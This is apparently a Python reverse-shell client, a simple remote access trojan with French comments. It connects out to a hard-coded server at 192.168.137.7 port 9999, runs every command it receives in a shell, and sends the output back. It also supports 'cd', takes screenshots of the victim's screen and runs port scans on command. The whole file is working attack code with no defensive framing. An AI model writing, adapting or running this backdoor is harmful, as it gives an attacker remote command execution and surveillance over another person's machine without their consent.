#!/usr/bin/env python3
import socket
import os
import subprocess
from PIL import ImageGrab
from scanner import p_arg, s_arg  # Import du scanner

# Configuration du serveur
HOST = '192.168.137.7'  # Adresse IP du serveur
PORT = 9999  # Port du serveur




def screenshot():
    """
    Capture une capture d'écran et la sauvegarde sous forme de fichier PNG.
    """
    try:
        screen = ImageGrab.grab()
        screen.save("screen.png")
    except Exception as e:
        pass


def execute_scanner(args):
    """
    Exécute le scanner avec les arguments donnés et retourne les résultats.
    """
    try:
        if args[0] == "-p":
            results = p_arg()
        elif args[0] == "-s":
            ports = [21, 22, 80]
            results = s_arg(ports)
        else:
            results = ["Commande non reconnue pour le scanner."]
        
        return "\n".join(str(result) for result in results) if results else "Aucun résultat."
    except Exception as e:
        return f"Erreur lors de l'exécution du scanner : {e}"


def connect_to_server():
    try:
        s = socket.socket()
        s.connect((HOST, PORT))

        while True:
            data = s.recv(1024)  # Taille du buffer

            if data[:2].decode("utf-8") == 'cd':
                os.chdir(data[3:].decode("utf-8"))

            if len(data) > 0:
                data = data.decode("utf-8")

                if data.startswith("scan"):
                    try:
                        args = data.split()[1:]  # Exemple : scan -p
                        scan_results = execute_scanner(args)
                        s.send(str.encode(scan_results + "\n"))
                    except Exception as e:
                        s.send(str.encode(f"Erreur lors du scan : {e}\n"))
                elif data == 'screenshot':
                    screenshot()
                else:
                    cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output_byte = cmd.stdout.read() + cmd.stderr.read()
                    output_str = str(output_byte, "utf-8")

                    s.send(str.encode(output_str + os.getcwd() + '> '))
    except Exception as e:
        pass
    finally:
        s.close()


if __name__ == "__main__":
    connect_to_server()
